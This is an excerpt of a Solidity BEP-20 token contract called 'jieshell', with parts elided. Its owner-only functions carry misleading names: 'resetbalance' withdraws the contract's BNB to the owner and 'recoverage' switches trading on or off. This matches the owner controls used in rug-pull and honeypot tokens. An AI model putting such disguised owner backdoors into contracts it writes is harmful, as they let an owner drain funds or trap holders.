...
contract jieshell is IERC20, AuthLibrary {
    using SafeMath for uint256;    
    address public constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant ZERO = 0x0000000000000000000000000000000000000000;
    string constant _name = "jieshell";
    string constant _symbol = "SHELL";
    ...
    function resetbalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(owner).transfer(amountBNB * amountPercentage / 100);
    }

    function recoverage(bool _status) public onlyOwner {
        tradingOpen = _status;
    }    
    ...
    function crossfee(address holder, bool exempt) external authorized {
